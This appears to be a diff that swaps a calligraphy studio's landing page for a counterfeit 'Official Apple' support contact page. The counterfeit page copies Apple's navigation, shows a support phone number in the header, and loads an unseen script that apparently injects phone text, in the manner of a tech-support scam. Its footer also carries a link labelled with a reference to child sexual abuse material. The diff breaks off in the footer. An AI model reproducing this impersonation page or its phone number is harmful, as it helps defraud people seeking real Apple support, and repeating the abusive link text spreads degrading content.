@@ -1,403 +1,375 @@
+
 <!DOCTYPE html>
-<html lang="en-GB">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Timeless Hand-Lettered Artistry at Scriptum Noble</title>
-  <link rel="icon" href="favicon.ico">
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
-  <style>
-    /* Custom CSS for styles and glassmorphism based on design system */
-    :root {
-      --bs-primary: #d4af37;
-      --bs-secondary: #222222;
-      --bs-accent: #91ea14;
-      --bs-background-base: #f9f8f6;
-      --bs-surface-glass: rgba(255, 255, 255, 0.6);
-      --bs-font-serif: 'PT Serif', serif;
-      --bs-font-sans-serif: 'Roboto', sans-serif;
-      --bs-border-radius: 4px;
-    }
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js">
 
-    body {
-      font-family: var(--bs-font-sans-serif);
-      background-color: var(--bs-background-base);
-      color: var(--bs-secondary);
-    }
 
-    h1, h2, h3, h4, h5, h6 {
-      font-family: var(--bs-font-serif);
-      font-weight: 700;
-    }
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta http-equiv="cache-control" content="max-age=3600" />
+    <title>Contact - Official Apple</title>
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more." />
+    <link rel="stylesheet" href="Base.css" type="text/css" />
+    <link rel="stylesheet" type="text/css" href="fonts/_families%3dSF%2bPro%2cv1_7CSF%2bPro%2bIcons%2cv1html.html" />
+    <script src="text_tel.js"></script>
+    <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-NP1FZ3QXDK"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
 
-    .btn-primary {
-      --bs-btn-bg: var(--bs-primary);
-      --bs-btn-border-color: var(--bs-primary);
-      --bs-btn-hover-bg: #8c7324; /* primaryDark */
-      --bs-btn-hover-border-color: #8c7324;
-      --bs-btn-active-bg: #8c7324;
-      --bs-btn-active-border-color: #8c7324;
-      --bs-btn-color: #ffffff;
-    }
+  gtag('config', 'G-NP1FZ3QXDK');
+</script>
 
-    .btn-dark {
-      --bs-btn-bg: var(--bs-secondary);
-      --bs-btn-border-color: var(--bs-secondary);
-      --bs-btn-hover-bg: #000000;
-      --bs-btn-hover-border-color: #000000;
-      --bs-btn-active-bg: #000000;
-      --bs-btn-active-border-color: #000000;
-      --bs-btn-color: #ffffff;
-    }
-
-    .btn-outline-dark {
-      --bs-btn-color: var(--bs-secondary);
-      --bs-btn-border-color: var(--bs-secondary);
-      --bs-btn-hover-color: #ffffff;
-      --bs-btn-hover-bg: var(--bs-secondary);
-      --bs-btn-hover-border-color: var(--bs-secondary);
-      --bs-btn-active-color: #ffffff;
-      --bs-btn-active-bg: var(--bs-secondary);
-      --bs-btn-active-border-color: var(--bs-secondary);
-    }
-    
-    .rounded-1 {
-        border-radius: var(--bs-border-radius) !important;
-    }
-
-    .pattern-gradient-radial {
-      background: radial-gradient(circle at top left, #f9f8f6, #e0e0d8); /* backgroundBase with a slight variation */
-    }
-
-    .backdrop-blur-sm {
-      backdrop-filter: blur(5px);
-       -webkit-backdrop-filter: blur(5px);
-    }
-
-    .backdrop-blur-md {
-      backdrop-filter: blur(10px);
-       -webkit-backdrop-filter: blur(10px);
-    }
-
-    .shadow-grow {
-        transition: transform 0.3s ease, box-shadow 0.3s ease;
-    }
-
-    .shadow-grow:hover {
-        transform: translateY(-5px);
-        box-shadow: 0 1rem 3rem rgba(0,0,0,.175) !important;
-    }
-
-    .transition-all {
-        transition: all 0.3s ease;
-    }
-
-    /* Icon styling - inline SVG */
-    .icon {
-      display: inline-block;
-      width: 1em;
-      height: 1em;
-      vertical-align: -0.125em;
-      fill: currentColor;
-    }
-
-    /* Override Bootstrap bg-opacity and text-bg-dark for contrast */
-    .bg-light.bg-opacity-50 {
-      background-color: rgba(248, 249, 250, 0.7) !important; /* Slightly more opaque for better contrast */
-    }
-    .text-bg-dark {
-      background-color: var(--bs-secondary) !important;
-      color: #ffffff !important;
-    }
-    .text-bg-dark .text-muted {
-        color: rgba(255, 255, 255, 0.75) !important;
-    }
-
-    /* Custom styles for image hover effect in services */
-    .service-card-image-wrapper {
-        position: relative;
-        overflow: hidden;
-        border-radius: var(--bs-border-radius);
-    }
-    .service-card-image-wrapper img {
-        transition: transform 0.5s ease-in-out;
-    }
-    .service-card-image-wrapper:hover img {
-        transform: scale(1.05);
-    }
-    
-    /* Ensure content contrast on cards with glassmorphism */
-    .bg-white.bg-opacity-75 {
-        background-color: rgba(255, 255, 255, 0.85) !important; /* Adjust for readability */
-    }
-    .bg-white.bg-opacity-50 {
-        background-color: rgba(255, 255, 255, 0.70) !important; /* Adjust for readability */
-    }
-  </style>
 </head>
+
 <body>
-  <header>
-    <nav id="site-nav" class="navbar navbar-expand-lg d-flex align-items-center justify-content-between p-3 bg-white fixed-top shadow-sm">
-      <div class="container">
-        <a class="navbar-brand fw-bold fs-4 text-dark" href="#">Scriptum Noble</a>
-        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
-          <span class="navbar-toggler-icon"></span>
-        </button>
-        <div class="collapse navbar-collapse justify-content-end" id="navbarNav">
-          <ul class="navbar-nav me-auto me-lg-0 mb-2 mb-lg-0 gap-3">
-            <li class="nav-item">
-              <a class="nav-link text-dark" href="#about">About</a>
-            </li>
-            <li class="nav-item">
-              <a class="nav-link text-dark" href="#services">Services</a>
-            </li>
-            <li class="nav-item">
-              <a class="nav-link text-dark" href="#workshops">Workshops</a>
-            </li>
-            <li class="nav-item">
-              <a class="nav-link text-dark" href="#testimonials">Testimonials</a>
-            </li>
-          </ul>
-          <a href="#contact" class="btn btn-dark fw-bold rounded-1 d-flex align-items-center gap-2 shadow-sm ms-lg-3">Inquire Now
-            <svg class="icon" viewBox="0 0 16 16">
-              <path fill-rule="evenodd" d="M1 8a.5.5 0 0 1 .5-.5h11.793l-3.147-3.146a.5.5 0 0 1 .708-.708l4 4a.5.5 0 0 1 0 .708l-4 4a.5.5 0 0 1-.708-.708L13.293 8.5H1.5A.5.5 0 0 1 1 8z"/>
-            </svg>
-          </a>
+    <div id="result"></div>
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate" />
+    <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+					 </span>
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+					 </span>
+				 </label>
+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+					 <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+					 <span class="ac-gn-menuanchor-label">Close Menu </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+					 <span class="ac-gn-link-text">Mac </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+					 <span class="ac-gn-link-text">iPad </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+					 <span class="ac-gn-link-text">iPhone </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+					 <span class="ac-gn-link-text">Watch </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+					 <span class="ac-gn-link-text">TV </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
+					 <span class="ac-gn-link-text">Music </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+					 <span class="ac-gn-link-text">Support </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+					 <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+					 <span class="ac-gn-link-text">Shopping Bag </span>
+					 <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false" />
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav" />
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
+                        </div>
+                    </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
+                </div>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+					 <span class="ac-gn-searchview-close-wrapper">
+						 <span class="ac-gn-searchview-close-left"></span>
+						 <span class="ac-gn-searchview-close-right"></span>
+					 </span>
+			 </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+                </div>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+                </div>
+            </aside>
         </div>
-      </div>
     </nav>
-  </header>
-<main>
-    <section id="hero" class="min-vh-100 d-flex align-items-center pt-5 pattern-gradient-radial position-relative">
-      <div class="glassmorphismOverlay position-absolute top-0 start-0 w-100 h-100 pointer-events-none bg-white bg-opacity-10 backdrop-blur-sm"></div>
-      <div class="container d-flex flex-column flex-lg-row align-items-center gap-5 pt-lg-0 pt-5 mt-5 mt-lg-0 position-relative z-1">
-        <div class="col-12 col-lg-6 order-1 order-lg-2">
-          <div class="service-card-image-wrapper">
-            <img src="images/hero-calligraphy-desk.jpeg" width="768" height="768" alt="Artist creating bespoke calligraphy at Scriptum Noble" class="img-fluid w-100 object-fit-cover shadow-sm rounded-1">
-          </div>
-        </div>
-        <div class="col-12 col-lg-6 order-2 order-lg-1 text-center text-lg-start">
-          <h1 class="display-4 fw-bold mb-3 text-secondary">Timeless Hand-Lettered Artistry at Scriptum Noble</h1>
-          <p class="lead mb-4">Transforming your most meaningful words into exquisite bespoke calligraphy, custom engravings, and luxury event invitations.</p>
-          <div class="d-flex flex-column flex-md-row justify-content-center justify-content-lg-start gap-3">
-            <a href="#contact" class="btn btn-primary fw-bold rounded-1 px-4 py-2 shadow-sm d-inline-flex align-items-center gap-2">
-              Commission a Piece
-              <svg class="icon" viewBox="0 0 16 16">
-                <path d="M13.56 12.39a.5.5 0 0 1-.5.5h-11a.5.5 0 0 1-.5-.5v-9a.5.5 0 0 1 .5-.5h5.05l-.5-.5H1.5A1.5 1.5 0 0 0 0 3.5v9A1.5 1.5 0 0 0 1.5 14h11A1.5 1.5 0 0 0 14 12.5v-5.05l-.5.5v5.05z"/>
-                <path d="M15.5 2.13a1 1 0 0 0-1.554-.748L7.14 7.02l-.5.5-.5.5v.71l-.1-.1-.7-.7-.1-.1L7.87 14.5a1 1 0 0 0 1.414 0L15.5 8.354a1 1 0 0 0 0-1.415l-6-6zM8.5 13.5l-2-.5 1.5-1.5zM14.5 7.5L9 13l-.5-.5L14 7l.5.5z"/>
-              </svg>
-            </a>
-            <a href="#workshops" class="btn btn-outline-dark fw-bold rounded-1 px-4 py-2 shadow-sm d-inline-flex align-items-center gap-2">
-              View Workshops
-              <svg class="icon" viewBox="0 0 16 16">
-                <path d="M3.5 0a.5.5 0 0 1 .5.5V1h8V.5a.5.5 0 0 1 1 0V1h1a2 2 0 0 1 2 2v11a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V3a2 2 0 0 1 2-2h1V.5a.5.5 0 0 1 .5-.5zM1 4v10a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1V4H1zm5.854-2.854a.5.5 0 0 1 0 .708L5.707 5H9.5a.5.5 0 0 1 0 1H5.707l1.147 1.146a.5.5 0 0 1-.708.708l-2-2a.5.5 0 0 1 0-.708l2-2a.5.5 0 0 1 .708 0z"/>
-              </svg>
-            </a>
-          </div>
-        </div>
-      </div>
-    </section>
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
 
-    <section id="about" class="py-5">
-      <div class="container d-flex flex-column gap-4 text-center">
-        <h2 class="display-5 text-secondary">The Scriptum Noble Difference</h2>
-        <p class="fs-5 lh-base mx-auto" style="max-width: 800px;">At Scriptum Noble, we believe that in our fast-paced digital world, the slow, intentional stroke of a pen holds unparalleled power. We utilize heritage techniques, ethically sourced archival inks, and premium cotton papers to craft pieces that endure for generations. From rigorous nib-preparation processes to our exclusive seal-wax blending, every detail matters. We are not just creating objects, but cherished heirlooms that tell your story.</p>
-      </div>
-    </section>
+    <div class="main">
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <span class="ac-ln-title">
+                       <a href="#">Apple Support +1-888-449-3823 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+					 </span>
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close"
+                            id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span>
+							 </label>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </nav>
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class='as-banner-cont'>
+                        <div class='as-banner-image as-banner-image--top'>
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("globalnav/apple/contact-us-hero.image.large_2x.jpg");
+                                }
 
-    <section id="services" class="py-5 bg-light bg-opacity-50">
-      <div class="container">
-        <h2 class="text-center mb-5 display-5 text-secondary">Our Artisanal Services</h2>
-        <div class="row g-4">
-          <div class="col-12 col-lg-8">
-            <div class="card p-4 d-flex flex-column justify-content-end h-100 rounded-1 position-relative overflow-hidden shadow-grow transition-all bg-white bg-opacity-75 backdrop-blur-md">
-              <div class="service-card-image-wrapper position-absolute top-0 start-0 w-100 h-100 z-0">
-                <img src="images/service-wedding-invitations.jpeg" width="896" height="512" alt="Custom wedding invitations by Scriptum Noble" class="img-fluid w-100 h-100 object-fit-cover">
-              </div>
-              <div class="card-body text-white z-1 p-0 mt-auto">
-                <h3 class="card-title h4 text-shadow-dark">Bespoke Invitations & Event Suites</h3>
-                <p class="card-text text-shadow-dark">Comprehensive design of your wedding or gala invitations, featuring hand-pressed foils, deckled edges, and custom spot-calligraphy.</p>
-              </div>
-            </div>
-          </div>
-          <div class="col-12 col-lg-4 d-flex flex-column gap-4">
-            <div class="card p-4 rounded-1 flex-grow-1 shadow-grow transition-all bg-white bg-opacity-75 backdrop-blur-md">
-              <div class="service-card-image-wrapper position-absolute top-0 start-0 w-100 h-100 z-0 opacity-25">
-                 <img src="images/service-glass-engraving.jpeg" width="448" height="256" alt="Engraving service on a perfume bottle" class="img-fluid w-100 h-100 object-fit-cover">
-              </div>
-              <div class="card-body z-1 p-0">
-                <h3 class="card-title h5 text-secondary">Glass & Metal Engraving</h3>
-                <p class="card-text text-dark">Permanent calligraphy on perfume bottles, wine glasses, and luxury gifting items, creating truly personal heirlooms.</p>
-              </div>
-               <svg class="icon position-absolute bottom-0 end-0 m-3 text-primary" style="width: 3rem; height: 3rem;" viewBox="0 0 16 16">
-                  <path d="M11.474 0H4.526L0 4.526v6.948L4.526 16h6.948L16 11.474V4.526L11.474 0zM8 12.5a4.5 4.5 0 1 1 0-9 4.5 4.5 0 0 1 0 9z"/>
-                  <path d="M8 5a3 3 0 1 0 0 6 3 3 0 0 0 0-6zm.5 1.5a.5.5 0 1 0-1 0 .5.5 0 0 0 1 0z"/>
-               </svg>
-            </div>
-            <div class="card p-4 rounded-1 flex-grow-1 shadow-grow transition-all bg-white bg-opacity-75 backdrop-blur-md">
-              <div class="service-card-image-wrapper position-absolute top-0 start-0 w-100 h-100 z-0 opacity-25">
-                 <img src="images/service-live-lettering.jpeg" width="448" height="256" alt="Live calligraphy event activation" class="img-fluid w-100 h-100 object-fit-cover">
-              </div>
-              <div class="card-body z-1 p-0">
-                <h3 class="card-title h5 text-secondary">On-Site Brand Activations</h3>
-                <p class="card-text text-dark">Live hand-lettering for corporate events, engaging guests with personalized keepsakes and unforgettable experiences.</p>
-              </div>
-              <svg class="icon position-absolute bottom-0 end-0 m-3 text-primary" style="width: 3rem; height: 3rem;" viewBox="0 0 16 16">
-                <path d="M6.5 1A1.5 1.5 0 0 0 5 2.5V3H1.5A1.5 1.5 0 0 0 0 4.5v10A1.5 1.5 0 0 0 1.5 16h13A1.5 1.5 0 0 0 16 14.5v-10A1.5 1.5 0 0 0 14.5 3H11V2.5A1.5 1.5 0 0 0 9.5 1h-3zm0 1h3a.5.5 0 0 1 .5.5V3H6v-.5a.5.5 0 0 1 .5-.5zM1.5 4H14.5a.5.5 0 0 1 .5.5v10a.5.5 0 0 1-.5.5h-13a.5.5 0 0 1-.5-.5v-10a.5.5 0 0 1 .5-.5z"/>
-              </svg>
-            </div>
-          </div>
-        </div>
-      </div>
-    </section>
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
 
-    <section id="workshops" class="py-5 position-relative">
-      <div class="container d-flex flex-column align-items-center text-center gap-4">
-        <h2 class="display-5 text-secondary">Learn with Scriptum Noble</h2>
-        <p class="fs-5 lh-base mx-auto" style="max-width: 800px;">Discover the meditative art of modern calligraphy. Our intensive sessions cover everything from basic upstrokes and pressure control to advanced flourishing and ink-mixing theory. Perfect for beginners and intermediate artists alike, these workshops foster creativity and precision.</p>
-        <ul class="list-unstyled d-flex flex-wrap justify-content-center gap-4 mb-4">
-          <li class="p-3 bg-white bg-opacity-75 backdrop-blur-sm rounded-1 shadow-sm fs-5 text-secondary">Introduction to Pointed Pen</li>
-          <li class="p-3 bg-white bg-opacity-75 backdrop-blur-sm rounded-1 shadow-sm fs-5 text-secondary">Copperplate Essentials</li>
-          <li class="p-3 bg-white bg-opacity-75 backdrop-blur-sm rounded-1 shadow-sm fs-5 text-secondary">Flourishing & Composition</li>
-          <li class="p-3 bg-white bg-opacity-75 backdrop-blur-sm rounded-1 shadow-sm fs-5 text-secondary">Envelope Addressing & Layout</li>
-        </ul>
-        <a href="#contact" class="btn btn-primary fw-bold rounded-1 px-4 py-2 mt-3 shadow-sm d-inline-flex align-items-center gap-2">
-          Reserve Your Seat
-          <svg class="icon" viewBox="0 0 16 16">
-            <path d="M10.854 7.146a.5.5 0 0 1 0 .708l-3 3a.5.5 0 0 1-.708 0l-1.5-1.5a.5.5 0 1 1 .708-.708L7.5 9.793l2.646-2.647a.5.5 0 0 1 .708 0z"/>
-            <path d="M3.5 0a.5.5 0 0 1 .5.5V1h8V.5a.5.5 0 0 1 1 0V1h1a2 2 0 0 1 2 2v11a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V3a2 2 0 0 1 2-2h1V.5a.5.5 0 0 1 .5-.5zM1 4v10a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1V4H1z"/>
-          </svg>
-        </a>
-      </div>
-    </section>
-
-    <section id="testimonials" class="py-5 bg-secondary bg-opacity-10">
-      <div class="container">
-        <h2 class="text-center mb-5 display-5 text-secondary">Words from Our Clients</h2>
-        <div class="row g-4 justify-content-center">
-          <div class="col-12 col-lg-4">
-            <div class="card p-4 rounded-1 shadow-grow transition-all bg-white bg-opacity-50 backdrop-blur-md h-100">
-              <h4 class="h5 text-primary mb-3">Exceptional Artistry!</h4>
-              <p class="card-text text-dark">"Scriptum Noble created the most breathtaking invitation suite for our wedding. The attention to detail in the bespoke wax seals and vintage stamps was unmatched. Truly made our special day even more memorable."</p>
-              <footer class="blockquote-footer mt-3 text-muted">Eleanor V., New York</footer>
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("globalnav/apple/contact-us-hero.image.small_2x.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="globalnav/apple/contact-us-hero.image.small_2x.jpg 735w, globalnav/apple/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="globalnav/apple/contact-us-hero.image.large_2x.jpg"
+                            />
+                        </div>
+                    </div>
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Apple Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock" />
+                        </div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
+                    </div>
+                </div>
             </div>
-          </div>
-          <div class="col-12 col-lg-4">
-            <div class="card p-4 rounded-1 shadow-grow transition-all bg-white bg-opacity-50 backdrop-blur-md h-100">
-              <h4 class="h5 text-primary mb-3">Engaging Brand Activation</h4>
-              <p class="card-text text-dark">"We hired them for a live engraving activation at our product launch party. Guests were utterly mesmerized by the artistry and loved receiving personalized items. A truly elevated, interactive experience that garnered significant social media buzz."</p>
-              <footer class="blockquote-footer mt-3 text-muted">Marcus T., Brand Manager, Luxury Goods Inc.</footer>
-            </div>
-          </div>
-          <div class="col-12 col-lg-4">
-            <div class="card p-4 rounded-1 shadow-grow transition-all bg-white bg-opacity-50 backdrop-blur-md h-100">
-              <h4 class="h5 text-primary mb-3">Inspiring Workshop!</h4>
-              <p class="card-text text-dark">"The beginner's calligraphy workshop was perfectly structured and incredibly inspiring. I left feeling confident with my oblique pen, loaded with high-quality supplies, and excited to continue my calligraphy journey. Highly recommend!"</p>
-              <footer class="blockquote-footer mt-3 text-muted">Anya S., Aspiring Calligrapher</footer>
-            </div>
-          </div>
-        </div>
-      </div>
-    </section>
-
-    <section id="contact" class="py-5 text-bg-dark pattern-gradient-radial">
-      <div class="container d-flex flex-column gap-5">
-        <div class="row g-4">
-          <div class="col-lg-5 d-flex flex-column gap-3">
-            <h2 class="h3 mb-3 text-white">Visit Scriptum Noble's Studio</h2>
-            <p class="mb-1 text-white">507 Linden Boulevard, New York, NY 11203, USA</p>
-            <p class="mb-1 text-white">Phone: <a href="tel:+13052020892" class="text-light text-decoration-none">+1 (305) 202-0892</a></p>
-            <p class="mb-1 text-white">Email: <a href="mailto:info@scriptumnoble.com" class="text-light text-decoration-none">info@scriptumnoble.com</a></p>
-            <p class="small text-white"><em>Studio visits are by appointment only to ensure dedicated attention to your project.</em></p>
-            <div class="mt-4">
-              <iframe 
-                src="https://maps.google.com/maps?q=New%20York,USA&t=&z=10&ie=UTF8&iwloc=&output=embed" 
-                width="100%" height="250" style="border:0;" allowfullscreen="" loading="lazy">
-              </iframe>
-            </div>
-          </div>
-          <div class="col-lg-6 offset-lg-1 rounded-1 p-4 bg-white bg-opacity-10 backdrop-blur-md shadow-lg">
-            <h2 class="h3 mb-4 text-white">Request a Commission</h2>
-            <form>
-              <div class="mb-3">
-                <label for="fullName" class="form-label text-light">Full Name</label>
-                <input type="text" class="form-control" id="fullName" placeholder="Jane Doe">
-              </div>
-              <div class="mb-3">
-                <label for="emailAddress" class="form-label text-light">Email Address</label>
-                <input type="email" class="form-control" id="emailAddress" placeholder="jane@example.com">
-              </div>
-              <div class="mb-3">
-                <label for="serviceOfInterest" class="form-label text-light">Service of Interest</label>
-                <select class="form-select" id="serviceOfInterest">
-                  <option selected disabled>Choose...</option>
-                  <option>Bespoke Invitations</option>
-                  <option>Engraving</option>
-                  <option>Live Event Activation</option>
-                  <option>Calligraphy Workshop</option>
-                  <option>Other</option>
-                </select>
-              </div>
-              <div class="mb-4">
-                <label for="projectDetails" class="form-label text-light">Project Details</label>
-                <textarea class="form-control" id="projectDetails" rows="4" placeholder="Share your vision and any specific requirements..."></textarea>
-              </div>
-              <button type="submit" class="btn btn-light fw-bold rounded-1 mt-3 w-100 d-flex align-items-center justify-content-center gap-2">
-                Send Inquiry
-                <svg class="icon" viewBox="0 0 16 16">
-                  <path d="M15.854.146a.5.5 0 0 1 .11.54l-5.819 14.547a.5.5 0 0 1-.9.02L2.5 1.708 1.146.438a.5.5 0 0 1 .428-.679L15.354.146z"/>
-                </svg>
-              </button>
-            </form>
-          </div>
-        </div>
-      </div>
-    </section>
-  </main>
-<footer class="footer text-bg-dark py-4">
-    <div class="container d-flex flex-column flex-md-row justify-content-between align-items-center pt-4">
-      <p class="mb-2 mb-md-0 text-white">&copy; 2024 Scriptum Noble. All rights reserved.</p>
-      <div class="d-flex gap-3">
-        <a href="./privacy.html" class="text-white text-decoration-none small">Privacy Policy</a>
-        <a href="./tos.html" class="text-white text-decoration-none small">Terms of Service</a>
-      </div>
+        </section>
     </div>
-    <div id="cookieConsent" class="cookie-consent-banner w-100 py-3 text-center text-white bg-secondary fixed-bottom d-none">
-      <div class="container d-flex flex-column flex-md-row justify-content-center align-items-center gap-3">
-        <span>We use cookies to ensure you get the best experience on our website.</span>
-        <button id="acceptCookies" class="btn btn-primary btn-sm rounded-1 px-3">Accept</button>
-      </div>
-    </div>
-  </footer>
-  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
-  <script>
-    document.addEventListener('DOMContentLoaded', function() {
-      const cookieConsentBanner = document.getElementById('cookieConsent');
-      const acceptCookiesButton = document.getElementById('acceptCookies');
-      const cookieName = 'consent_Scriptum Noble_cookies_accepted';
 
-      // Check if the user has already accepted cookies
-      if (!localStorage.getItem(cookieName)) {
-        cookieConsentBanner.classList.remove('d-none');
-      }
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">CH!LD P0RN0GRÀPHY WEBSITE </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
+                </div>
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="globalnav/apple/us.png" alt="" width="16" height="16" />United
+					States </a>
+                </div>
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">Copyright© 2025 Apple . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
+					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
